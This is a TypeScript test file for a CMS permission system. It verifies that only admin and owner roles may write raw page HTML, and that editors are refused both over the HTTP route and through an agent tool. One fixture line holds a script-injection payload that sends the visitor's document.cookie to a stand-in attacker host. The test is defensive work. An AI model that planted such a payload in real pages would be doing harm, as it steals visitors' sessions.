import assert from "node:assert/strict";
import test from "node:test";

import {
  InMemoryPolicyPermissionRepo,
  InMemoryPolicyRepo,
  InMemoryPrincipalPolicyRepo,
  InMemoryPrincipalRepo,
  InMemoryPrincipalRoleRepo,
  InMemoryRolePolicyRepo,
  InMemoryRoleRepo,
  InMemorySessionRepo,
  InMemoryUserRepo,
  authorize,
  migrateDeprecatedPermissionGrants,
  seedIdentity,
  type IdentityRepos,
} from "@jini-ai/cms/identity";

import { applyBuiltinRoleGrants } from "../../identity/builtin-role-grants.js";
import { InMemoryPostRepo, createPost } from "../../post/index.js";
import { InMemoryPagesHtmlDocumentStore } from "../html-document-store.memory.js";
import { buildPagesRegistrations } from "../tool-registrations.js";

/**
 * @file SPEC-047 REQ-9 — `pages.edit_html` is a REAL permission, and an `editor` does not hold it.
 *
 * ## What this certifies, and why a weaker test would not
 *
 * Writing a Page's bespoke HTML body is, by design, writing unsanitized markup that renders into
 * the public site (`update-html.ts`'s own "No HTML sanitization" note). That is the feature, not a
 * bug — but it means the write is a script-injection capability, and REQ-9 has always said it
 * belongs to `admin`, not to `editor`. Until this landed, both sinks checked `content.write`, which
 * `editor` holds, so the permission existed only in prose.
 *
 * The assertions that matter are the REFUSALS. A test that only proves an admin can still write
 * passes identically against the old, ungated-in-practice code and certifies nothing. So the
 * primary case here is an `editor`-role principal attempting the injection and being refused, with
 * the exact refusal reason pinned.
 *
 * ## Why the whole chain is real
 *
 * The interesting failure mode is not "does `authorize()` work" — it is "does the permission row
 * actually reach the admin role, and actually NOT reach the editor role, in a workspace seeded the
 * way every real install is seeded". That question spans three components that a fake would hide:
 * `seedIdentity`'s built-in role/policy grants, `migrateDeprecatedPermissionGrants`' fan-out (how
 * `pages.edit_html` reaches an ALREADY-seeded workspace — `seedIdentity` early-returns once an owner
 * exists, so the seed list alone can never reach one), and `authorize()`'s own row matching. All
 * three are the real implementations here, over the real in-memory repo adapters.
 *
 * `buildChain` covers BOTH seed vintages for that reason — see {@link Vintage}. The fan-out alone
 * reaches only a workspace seeded by the current library; the workspace this repo actually runs on
 * predates `theme.edit`'s addition to the admin seed list and is covered by the
 * `"pre-theme-edit"` cases below.
 *
 * ## Both sinks, not one
 *
 * Exactly two call sites write `"html"`-format rows — `PagesHtmlDocumentStore` is the only writer of
 * them anywhere (`features/pages/index.ts`), and it is reached from the HTTP route
 * (`routes/pages/update-html.ts`) and from the `pages_write_html` agent tool. The agent tool is
 * certified below; the HTTP route is certified in
 * `server/__tests__/routes/pages-update-html-auth.test.ts` against this same real identity chain.
 * Fixing one and not the other would leave the capability reachable by a different door.
 */

/**
 * Pinned as a literal, deliberately, exactly as `pages-update-html-auth.test.ts` pins its own.
 * `authorize()` matches `policy_permissions` rows by exact string and never consults the permission
 * catalog, so a typo or a rename would not fail loudly — it would silently refuse every principal
 * except `owner` (who short-circuits on the `*` wildcard). Reading the constant out of the module
 * under test would make this test agree with a typo instead of catching it.
 */
const PAGES_EDIT_HTML = "pages.edit_html";

/** The permission `editor` DOES hold. Asserted alongside, so a refusal below is provably about this
 *  specific capability and not about a principal that was never wired up at all. */
const CONTENT_WRITE = "content.write";

const WORKSPACE = "ws-edit-html-privilege";
const clock = { nowIso: () => "2026-09-05T00:00:00.000Z" };

function counterIdGen(prefix: string) {
  let n = 0;
  return { newId: () => `${prefix}-${++n}` };
}

/**
 * argon2id is ~100ms per hash and this file never verifies a password — the seed only needs SOME
 * hasher to satisfy the port. Swapping it out keeps the file fast without weakening anything the
 * file actually asserts.
 */
const fakeHasher = {
  hash: async (password: string) => `hashed:${password}`,
  verify: async (hash: string, password: string) => hash === `hashed:${password}`,
};

interface Chain {
  readonly repos: IdentityRepos;
  /** Principal ids by built-in role name, each assigned that role and nothing else. */
  readonly principals: Record<"owner" | "admin" | "editor" | "viewer", string>;
  can(principalId: string, permission: string): Promise<{ allowed: boolean; reason: string }>;
}

/**
 * Which vintage of `seedIdentity`'s built-in grant lists a workspace was seeded from.
 *
 * `"fresh"` is a workspace seeded by the CURRENT library, whose admin policy therefore holds
 * `theme.edit`. `"pre-theme-edit"` is a workspace seeded before `theme.edit` joined
 * `BUILTIN_ADMIN_PERMISSIONS` — which is what this repo's own `sites/tovu-com/content.db` IS. Its
 * `admin-builtin-policy` holds every string in the current admin seed list EXCEPT `theme.edit`,
 * `workspace.manage`, and `admin.assistant.manage`, and `seedIdentity` early-returns once an owner
 * user exists, so it will never gain them.
 *
 * The distinction is the whole point of this file. A permission that reaches admin only through the
 * `theme.edit -> pages.edit_html` fan-out reaches admin only in the `"fresh"` vintage, and a test
 * that seeds only fresh workspaces certifies a capability that every already-deployed workspace
 * does not have.
 */
type Vintage = "fresh" | "pre-theme-edit";

/**
 * Seed a workspace exactly as first boot does, run the permission-migration fan-out exactly as
 * `features/identity/wiring.ts` does on every boot, then mint one principal per built-in role.
 *
 * The migration step is not incidental. `seedIdentity` returns early once an owner user exists, so
 * a permission added to its built-in grant lists only ever reaches FRESH workspaces; every already-
 * seeded install (including this repo's own `content.db`) can only gain a new grant through
 * `migrateDeprecatedPermissionGrants`. Running it here is what makes this test cover the case that
 * actually ships.
 */
async function buildChain(vintage: Vintage = "fresh"): Promise<Chain> {
  const repos: IdentityRepos = {
    principals: new InMemoryPrincipalRepo(),
    users: new InMemoryUserRepo(),
    sessions: new InMemorySessionRepo(),
    roles: new InMemoryRoleRepo(),
    policies: new InMemoryPolicyRepo(),
    policyPermissions: new InMemoryPolicyPermissionRepo(),
    rolePolicies: new InMemoryRolePolicyRepo(),
    principalRoles: new InMemoryPrincipalRoleRepo(),
    principalPolicies: new InMemoryPrincipalPolicyRepo(),
  };
  const idGen = counterIdGen("seed");

  await seedIdentity({
    deps: { repos, hasher: fakeHasher, clock, idGen },
    input: { workspaceId: WORKSPACE, ownerUsername: "owner-under-test", ownerPassword: "irrelevant" },
  });

  if (vintage === "pre-theme-edit") await dropAdminThemeEdit(repos);

  await migrateDeprecatedPermissionGrants({
    policyPermissions: repos.policyPermissions,
    policies: repos.policies,
    idGen: counterIdGen("mig"),
    workspaceId: WORKSPACE,
  });

  await applyBuiltinRoleGrants({
    roles: repos.roles,
    rolePolicies: repos.rolePolicies,
    policies: repos.policies,
    policyPermissions: repos.policyPermissions,
    idGen: counterIdGen("backfill"),
    workspaceId: WORKSPACE,
  });

  const roles = await repos.roles.list({ workspaceId: WORKSPACE });
  const principals = {} as Chain["principals"];
  for (const name of ["owner", "admin", "editor", "viewer"] as const) {
    const role = roles.find((row) => row.name === name);
    assert.ok(role, `the built-in '${name}' role must exist after seeding`);

    const principalId = `principal-${name}`;
    await repos.principals.save({
      id: principalId,
      workspaceId: WORKSPACE,
      kind: "user",
      displayName: name,
      status: "active",
      createdAt: clock.nowIso(),
    });
    await repos.principalRoles.save({
      id: `pr-${name}`,
      workspaceId: WORKSPACE,
      principalId,
      roleId: role.id,
    });
    principals[name] = principalId;
  }

  const can = (principalId: string, permission: string) =>
    authorize({
      deps: {
        principals: repos.principals,
        principalRoles: repos.principalRoles,
        rolePolicies: repos.rolePolicies,
        principalPolicies: repos.principalPolicies,
        policyPermissions: repos.policyPermissions,
      },
      principalId,
      permission,
      // `"post"` is what both sinks pass — a Page is a `posts` row. Seeded grants carry
      // `resourceType: null`, so this is the same match either way; passing it keeps the harness
      // identical to the production call rather than an easier version of it.
      context: { workspaceId: WORKSPACE, entityType: "post" },
    });

  return { repos, principals, can };
}

/**
 * Rewind the seeded `admin` policy to its pre-`theme.edit` vintage by removing that one row.
 *
 * Asserts the row was there before removing it, deliberately: if `theme.edit` ever leaves
 * `BUILTIN_ADMIN_PERMISSIONS`, this fixture would otherwise silently stop simulating anything and
 * the `"pre-theme-edit"` cases would start passing for the wrong reason.
 */
async function dropAdminThemeEdit(repos: IdentityRepos): Promise<void> {
  const policy = await repos.policies.findByName({ workspaceId: WORKSPACE, name: "admin-builtin-policy" });
  assert.ok(policy, "seedIdentity must have created the built-in admin policy");

  const grants = await repos.policyPermissions.listByPolicyId({ workspaceId: WORKSPACE, policyId: policy.id });
  const themeEdit = grants.find((row) => row.permission === "theme.edit");
  assert.ok(themeEdit, "the current admin seed list must still contain theme.edit for this rewind to mean anything");

  await repos.policyPermissions.delete({ workspaceId: WORKSPACE, id: themeEdit.id });
}

// ---------------------------------------------------------------------------
// The refusal — the primary certification.
// ---------------------------------------------------------------------------

test("an 'editor' principal does NOT hold pages.edit_html, so it cannot author raw HTML into a public page", async () => {
  const { principals, can } = await buildChain();

  const decision = await can(principals.editor, PAGES_EDIT_HTML);

  assert.equal(decision.allowed, false, "an editor must not hold the raw-HTML authoring capability (SPEC-047 REQ-9)");
  // `no_grant` specifically, not merely "not allowed": it proves NO row for this permission reached
  // the editor policy at all. A `resource_scope_mismatch` or `unconstrained_deny` here would mean a
  // row DID land on the editor and was refused for an incidental reason a later edit could undo.
  assert.equal(decision.reason, "no_grant");
});

test("that refusal is specific to raw-HTML authoring — the same editor still holds content.write, so ordinary content editing is untouched", async () => {
  const { principals, can } = await buildChain();

  const decision = await can(principals.editor, CONTENT_WRITE);

  // Without this, the test above would also pass against a broken chain that simply never granted
  // the editor anything. This is what makes the refusal a NARROWED capability rather than a lockout.
  assert.equal(decision.allowed, true, "removing raw-HTML authoring must not cost the editor ordinary content editing");
  assert.equal(decision.reason, "matched");
});

test("a 'viewer' principal is refused pages.edit_html", async () => {
  const { principals, can } = await buildChain();

  const decision = await can(principals.viewer, PAGES_EDIT_HTML);

  assert.equal(decision.allowed, false);
  assert.equal(decision.reason, "no_grant");
});

// ---------------------------------------------------------------------------
// The grant — present to prove the gate is a gate and not a wall.
// ---------------------------------------------------------------------------

test("an 'admin' principal in a freshly-seeded workspace holds pages.edit_html, via the theme.edit fan-out", async () => {
  const { principals, can } = await buildChain();

  const decision = await can(principals.admin, PAGES_EDIT_HTML);

  assert.equal(decision.allowed, true, "gating on a permission no role holds would break the feature instead of securing it");
  assert.equal(decision.reason, "matched");
});

// ---------------------------------------------------------------------------
// The vintage that actually ships: an ALREADY-seeded workspace, seeded before
// `theme.edit` joined BUILTIN_ADMIN_PERMISSIONS. `sites/tovu-com/content.db` is
// exactly this — its `admin-builtin-policy` has no `theme.edit` row, so the
// `theme.edit -> pages.edit_html` fan-out matches nothing and grants nothing.
// ---------------------------------------------------------------------------

test("an 'admin' principal in a pre-theme.edit workspace ALSO holds pages.edit_html — the grant cannot depend on a seed row that workspace never got", async () => {
  const { principals, can } = await buildChain("pre-theme-edit");

  const decision = await can(principals.admin, PAGES_EDIT_HTML);

  // Without this, `pages.edit_html` materializes only in a freshly-seeded workspace. Every already-
  // deployed one — including this repo's own content.db — silently loses raw-page-HTML authoring
  // for admin, leaving `owner` as the only principal that clears the gate (on its `*` wildcard).
  assert.equal(decision.allowed, true, "admin must hold pages.edit_html in an already-seeded workspace too");
  assert.equal(decision.reason, "matched");
});

test("that pre-theme.edit backfill reaches ONLY admin — the editor is still refused, which is the security property REQ-9 exists for", async () => {
  const { principals, can } = await buildChain("pre-theme-edit");

  const editorDecision = await can(principals.editor, PAGES_EDIT_HTML);
  assert.equal(editorDecision.allowed, false, "whatever grants admin the capability must not reach the editor role");
  assert.equal(editorDecision.reason, "no_grant");

  const viewerDecision = await can(principals.viewer, PAGES_EDIT_HTML);
  assert.equal(viewerDecision.allowed, false);
  assert.equal(viewerDecision.reason, "no_grant");

  // Same narrowing assertion the fresh-vintage case makes: a refusal is only meaningful if the
  // editor is otherwise a working principal.
  const contentDecision = await can(principals.editor, CONTENT_WRITE);
  assert.equal(contentDecision.allowed, true);
  assert.equal(contentDecision.reason, "matched");
});

test("the pre-theme.edit backfill is additive — it never invents a theme.edit row, so admin does not silently regain site-wide theme-source authoring", async () => {
  const { repos } = await buildChain("pre-theme-edit");

  const policy = await repos.policies.findByName({ workspaceId: WORKSPACE, name: "admin-builtin-policy" });
  assert.ok(policy);
  const held = (await repos.policyPermissions.listByPolicyId({ workspaceId: WORKSPACE, policyId: policy.id })).map(
    (row) => row.permission
  );

  assert.ok(held.includes(PAGES_EDIT_HTML), "the one capability under discussion is granted");
  // `theme.edit` is a STRICTLY LARGER script-injection capability than pages.edit_html: a theme
  // template renders on every page of the site, not on one. Restoring it to this workspace is a
  // separate decision, and this fix must not make it silently.
  assert.ok(!held.includes("theme.edit"), "restoring page-HTML authoring must not also restore theme-source authoring");
});

test("the 'owner' principal is unaffected — it clears the gate on its '*' wildcard, not on a granted row", async () => {
  const { principals, can } = await buildChain();

  const decision = await can(principals.owner, PAGES_EDIT_HTML);

  assert.equal(decision.allowed, true);
  // Named explicitly: the owner policy holds ONLY `*`, so the migration never adds a row to it. If
  // this ever read `matched`, the fan-out would have started writing rows onto the wildcard policy.
  assert.equal(decision.reason, "owner_wildcard");
});

// ---------------------------------------------------------------------------
// Sink 2 of 2: the agent tool. (Sink 1, the HTTP route, is certified in
// server/__tests__/routes/pages-update-html-auth.test.ts against this same chain.)
// ---------------------------------------------------------------------------

/** Boot the real Pages tool registrations over the real `authorize()` from {@link buildChain}, with
 *  a store that records every method it is asked for so a refusal can be proven to touch nothing. */
async function toolHarness() {
  const chain = await buildChain();
  const postRepo = new InMemoryPostRepo([]);
  const storeCalls: string[] = [];

  const registrations = buildPagesRegistrations({
    workspaceId: WORKSPACE,
    authorize: (params) =>
      chain.can(params.principalId, params.permission) as ReturnType<
        Parameters<typeof buildPagesRegistrations>[0]["authorize"]
      >,
    postRepo,
    pagesHtmlStore: (scope) => {
      const real = new InMemoryPagesHtmlDocumentStore(scope, { repo: postRepo, clock });
      return {
        ensureHtmlFormat: async (seedHtml: string) => {
          storeCalls.push("ensureHtmlFormat");
          return real.ensureHtmlFormat(seedHtml);
        },
        read: async () => {
          storeCalls.push("read");
          return real.read();
        },
        write: async (html: string) => {
          storeCalls.push("write");
          return real.write(html);
        },
        // Not spied: `capturedVersion` is a pure accessor over what the three calls above already
        // recorded, so counting it would add a call to `storeCalls` that says nothing about which
        // store operations a refused tool call reached.
        capturedVersion: () => real.capturedVersion(),
      };
    },
  });

  const byName = new Map(registrations.map((entry) => [entry.descriptor.id, entry]));
  const call = (name: string, principalId: string, input: Record<string, unknown>) => {
    const entry = byName.get(name);
    assert.ok(entry, `tool '${name}' is not registered`);
    return entry.handler({
      principal: { id: principalId, kind: "user" },
      signal: new AbortController().signal,
      input,
    } as never);
  };

  await createPost({
    deps: { repo: postRepo, clock },
    input: { workspaceId: WORKSPACE, id: "page-1", title: "Landing", kind: "page" },
  });

  return { chain, postRepo, storeCalls, call };
}

const INJECTION = `<section data-agent-element="hero"><script>fetch('https://attacker.example/'+document.cookie)</script></section>`;

test("pages_write_html REFUSES an editor's script injection, names pages.edit_html in the refusal, and never touches the store", async () => {
  const { chain, postRepo, storeCalls, call } = await toolHarness();

  await assert.rejects(
    () => call("pages_write_html", chain.principals.editor, { id: "page-1", html: INJECTION }),
    // The exact text, not a truthy check: this is the string an operator reads when a legitimate
    // author is refused, and it is the only place the permission name surfaces to a caller.
    // `requireToolPermission` builds it as `principal '<id>' is not authorized for '<perm>' (<reason>)`.
    (err: Error) =>
      err.message === `principal 'principal-editor' is not authorized for 'pages.edit_html' (no_grant)`
  );

  // The assertion that makes this worth having. `ensureHtmlFormat` alone would already have
  // CONVERTED the row's body_format and dropped its body_json — a destructive side effect reached
  // before any write. A 403 that still ran it would look closed and not be.
  assert.deepEqual(storeCalls, [], "a refused tool call must not reach the store at all");

  const row = await postRepo.findById({ workspaceId: WORKSPACE, id: "page-1" });
  assert.equal(row?.bodyFormat, "doc", "the page must still be an untouched doc-format row");
  assert.equal(row?.bodyHtml, null, "no markup may have been persisted");
});

test("pages_write_html still serves an admin, so the gate narrows the capability rather than removing it", async () => {
  const { chain, postRepo, storeCalls, call } = await toolHarness();

  const html = `<section data-agent-element="hero"><h1>Legitimate</h1></section>`;
  const result = (await call("pages_write_html", chain.principals.admin, { id: "page-1", html })) as {
    written: boolean;
  };

  assert.equal(result.written, true);
  // read-then-convert, not convert-then-read (changed 2026-09-09 with `expectedVersion`): the read
  // has to come first so a caller-stated basis is compared against the version the compare-and-set
  // will use, and `ensureHtmlFormat` on a `doc` row is itself a version bump. On this page — never
  // written before — the read is the one that raises PageNotFoundError, so the conversion follows it.
  assert.deepEqual(storeCalls, ["read", "ensureHtmlFormat", "write"]);

  const row = await postRepo.findById({ workspaceId: WORKSPACE, id: "page-1" });
  assert.equal(row?.bodyHtml, html);
});
